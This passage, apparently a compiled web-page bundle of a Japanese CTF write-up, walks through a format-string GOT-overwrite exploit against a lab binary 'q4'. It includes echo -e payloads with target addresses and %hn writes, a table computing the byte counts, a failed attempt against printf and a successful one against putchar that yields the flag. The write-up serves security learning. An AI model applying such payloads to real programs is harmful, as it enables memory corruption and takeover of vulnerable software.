'r\\n\\xe0\\x99\\x04\\x08\\xe2\\x99\\x04\\x08%39400x%6$hn%28180x%7$hn' | gdb -q ./q4\nReading symbols from /home/q4/q4...(no debugging symbols found)...done.\n(gdb) Hangup detected on fd 0\nerror detected on stdin\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br"),s("span",{staticClass:"line-number"},[this._v("2")]),s("br"),s("span",{staticClass:"line-number"},[this._v("3")]),s("br"),s("span",{staticClass:"line-number"},[this._v("4")]),s("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("table",[e("thead",[e("tr",[e("th",{staticStyle:{"text-align":"center"}},[t._v("入力アドレス")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("出力バイト数")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("総出力バイト数")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),e("tbody",[e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("0x080499f0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4バイトずつ攻撃")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("0x080499f2")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("8")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("''")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%34441x")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("34441")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("34449")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("34449(0x8691)-8=34441")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%6$n")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("34449")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("引数は6個目から")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%33139x")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("33139")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("67588")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("67588(0x10804)-34449=33139")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%7$n")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("67588")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("次は7個目")])])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("コマンドは次の通り")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash= line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("$ echo -e '\\xf0\\x99\\x04\\x08\\xf2\\x99\\x04\\x08%34441x%6$hn%33139x%7$hn' | ./q4\n~~ 略 ~~~\nDo you want the flag?\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br"),s("span",{staticClass:"line-number"},[this._v("2")]),s("br"),s("span",{staticClass:"line-number"},[this._v("3")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("通らない...")]),this._v(" "),s("li",[this._v("一応putcharも試す")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash= line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[this._v("$ echo -e '\\xe0\\x99\\x04\\x08\\xe2\\x99\\x04\\x08%34441x%6$hn%33139x%7$hn' | ./q4\n~~ 略 ~~~\nFLAG_~~~ 略 ~~~\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br"),s("span",{staticClass:"line-number"},[this._v("2")]),s("br"),s("span",{staticClass:"line-number"},[this._v("3")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("通った!!!!!!!")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"感想"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#感想","aria-hidden":"true"}},[this._v("#")]),this._v(" 感想")])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("通せたのは嬉しい")]),this._v(" "),s("li",[this._v("printfは何故に通らなかったの?")]),this._v(" "),s("li",[this._v("ハリネズミ本を見返したら, 正しくはformat string attackではなく, got overwriteだったらしい")])])}],!1,null,null,null);a.options.__file="villager_a.md";s.default=a.exports}}]);